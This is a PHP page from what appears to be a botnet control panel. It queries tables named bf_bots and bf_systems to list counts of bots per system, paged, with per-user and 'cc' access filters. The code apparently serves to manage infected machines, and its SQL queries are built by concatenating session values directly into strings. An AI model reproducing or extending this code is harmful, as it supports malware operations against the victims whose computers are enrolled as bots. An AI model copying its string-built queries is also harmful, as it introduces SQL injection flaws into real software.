<?php

get_function('html_pages');

$page['count_page'] = 100;

$list = array();
$systems = array();

function get_list($row){
	global $list, $systems;
	if($systems[$row->system]){
		$list[$row->system]['name'] = $systems[$row->system];
		$list[$row->system]['system'] = $row->system;
		$list[$row->system]['count'] = $row->count;
	}
}

function get_sys($row){
	global $systems;
	$systems[$row->nid] = $row->name;
}

$sql = array();

if(!empty($_SESSION['user']->config['userid'])){
	$sql['userid'] = 'userid = \''.$_SESSION['user']->config['userid'].'\'';
}

if($_SESSION['user']->config['infoacc'] == '1'){	
	if(is_array($_SESSION['user']->config['systems'])){
		foreach($_SESSION['user']->config['systems'] as $key => $item){
			$sql['system'] .= ' OR (system = \''.$key.'\')';
		}
	}
	
	foreach($sql as $sk => $si){
		$sql[$sk] = preg_replace('~^ OR ~', '', $sql[$sk]);
		$sql[$sk] = '('.$sql[$sk].') AND ';
	}

	if($_SESSION['user']->access['logs']['cc'] != 'on'){
		$mysqli->query('SELECT nid, name FROM bf_systems WHERE (nid != \'cc\')', null, 'get_sys', false);
		$mysqli->query('SELECT DISTINCT(system) system, COUNT(system) count FROM bf_bots WHERE '.$sql['system'].$sql['userid'].' (system != \'cc\') GROUP by system LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, 'get_list', false);
		$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(system)) count FROM bf_bots WHERE '.$sql['system'].$sql['userid'].' (system != \'cc\') GROUP by system');
	}else{
		$mysqli->query('SELECT nid, name FROM bf_systems', null, 'get_sys', false);
		$mysqli->query('SELECT DISTINCT(system) system, COUNT(system) count FROM bf_bots WHERE '.preg_replace('~ AND $~', '', $sql['system'].$sql['userid']).' GROUP by system LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, 'get_list', false);
		$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(system)) count FROM bf_bots WHERE '.preg_replace('~ AND $~', '', $sql['system'].$sql['userid']).' GROUP by system');
	}
}else{
	foreach($sql as $sk => $si){
		$sql[$sk] = preg_replace('~^ OR ~', '', $sql[$sk]);
		$sql[$sk] = '('.$sql[$sk].') AND ';
	}
	
	if($_SESSION['user']->access['logs']['cc'] != 'on'){
		$mysqli->query('SELECT nid, name FROM bf_systems WHERE (nid != \'cc\')', null, 'get_sys', false);
		$mysqli->query('SELECT DISTINCT(system) system, COUNT(system) count FROM bf_bots WHERE '.$sql['userid'].'(system != \'cc\') GROUP by system LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, 'get_list', false);
		$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(system)) count FROM bf_bots WHERE '.$sql['userid'].'(system != \'cc\') GROUP by system');
	}else{
		$mysqli->query('SELECT nid, name FROM bf_systems', null, 'get_sys', false);
		$mysqli->query('SELECT DISTINCT(system) system, COUNT(system) count FROM bf_bots '.(!empty($sql['userid'])?'WHERE ' . preg_replace('~ AND $~', '', $sql['userid']):'').' GROUP by system LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, 'get_list', false);
		$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(system)) count FROM bf_bots '.(!empty($sql['userid'])?'WHERE ' . preg_replace('~ AND $~', '', $sql['userid']):'').' GROUP by system');
	}
}

$smarty->assign('list', $list);
$smarty->assign('pages', html_pages('/bots/?', $counts, $_SESSION['user']->config['cp']['bots'], 1, 'bots_list_country', 'this.href'));

$smarty->assign('title', $lang['bots'] . ' - ' . $lang['blc']);
?>